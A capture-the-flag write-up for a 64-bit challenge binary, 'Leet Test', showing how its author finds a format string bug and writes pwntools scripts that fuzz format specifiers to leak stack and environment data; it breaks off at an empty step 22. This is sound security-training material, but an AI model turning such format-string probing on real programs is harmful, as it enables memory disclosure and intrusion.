# Leet Test
> Write-up author: jon-brandy
## DESCRIPTION:
Are you 1337 enough?
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.
2. Now check the file type.

> RESULT - 64 BIT binary file, dynamically linked, not stripped.

![image](https://user-images.githubusercontent.com/70703371/210160534-d3b9375c-ea12-4897-9164-e86fa02cec9a.png)


3. Now check the binary's protection.

> RESULT - Partial RELRO, No canary found, No PIE

![image](https://user-images.githubusercontent.com/70703371/210160549-d94c6c8d-ede2-4b32-a57f-0375c4122480.png)


4. Let's open the binary in ghidra.

> RESULT - MAIN

![image](https://user-images.githubusercontent.com/70703371/210160613-fde04826-f2ec-4a81-a432-a08e4c1c27ed.png)


5. As we can see from the main function there's no bufferoverflow, but there's format strings vulnerability.

![image](https://user-images.githubusercontent.com/70703371/210160663-ce69190c-30df-465b-8f2c-03dbc6d6470e.png)


6. Notice the `local_13c` value multiplied by 0x1337c0de and compared to the winner which in the **.data** section.

> WINNER VALUE

![image](https://user-images.githubusercontent.com/70703371/210160678-49f0fc94-7c11-45f5-b274-74eda075b27e.png)


7. The value of variable `local_13c` is read in from `/dev/urandom`

![image](https://user-images.githubusercontent.com/70703371/210160703-2c5e0343-ea88-4132-81f4-b16c0bcd3c13.png)


8. What comes to my mind is we could overwrite the value of `local_13c` in the `/dev/urandom` with the value of `winner` divided by the `1337c0de`.

```
local_13c * 1337c0de / 1337c0de
```

9. But the problem here is, we will get a float value and float value will converted in various forms in hex.
10. So that's not the correct approach.
11. Anyway let's utilize the format string vulnerability to see if there's any clue.
12. I made a script to fuzz the format strings specifier.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

elf = context.binary = ELF('./leet_test', checksec=False)
sh = process(level='error')
for i in range(256): # random range
    try:
        sh.sendline('%{}$s'.format(i))
        sh.recvuntil('Hello,')
        result = sh.recvline() # to receive the response / result
        print(str(i) + ': ' + str(result))
    except EOFError:
        pass
```

13. First, run chmod to make the binary executeable, then run the script.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210160957-c1996945-770f-4327-ac66-36a941c93e98.png)


14. Hmm.. Got only 4 iterations, let's try to `$p`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210160967-a7e02ffa-35d8-4264-8a01-cc0c45443148.png)


15. Got a bunch of stack addresses. 
16. Hmm... Let's upgrade our fuzzy script to this:

```py
from pwn import *
import os

os.system('clear')

elf = context.binary = ELF('./leet_test', checksec=False)
context.log_level = 'error'
for i in range(256): # random range
    try:
        sh = process('./leet_test')
        sh.sendline('%{}$s'.format(i))
        sh.recvuntil('Hello,')
        result = sh.recvline() # to receive the response / result
        print(str(i) + ': ' + str(result))
        sh.close()
    except EOFError:
        pass
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/210161010-d65ca93d-fd65-475c-863e-5fd10e2a1ff0.png)


17. Notice that we're getting down to the environtment variables on my system.
18. Now let's check wheter we can put our string inside.

```py
from pwn import *
import os

os.system('clear')

elf = context.binary = ELF('./leet_test', checksec=False)
context.log_level = 'error'

sh = process('./leet_test')
sh.sendline('AAAAAAAA')

for i in range(256): # random range
    try:
        #sh = process('./leet_test')
        sh.sendline('%{}$x'.format(i))
        sh.recvuntil('Hello,')
        result = sh.recvline() # to receive the response / result
        print(str(i) + ': ' + str(result))
        #sh.close()
    except EOFError:
        pass
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/210161093-4cc695bc-7439-4df4-a332-592f5cf3d0ea.png)


19. We succeed here, but we want to see the `hex` format of A (0x41).
20. Let's add another 4 bytes.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210161105-bae24168-def5-4b74-8fd1-1e43735ff555.png)


21. Yep we got it, means we need to right 8 bytes before print any address. 
22. 
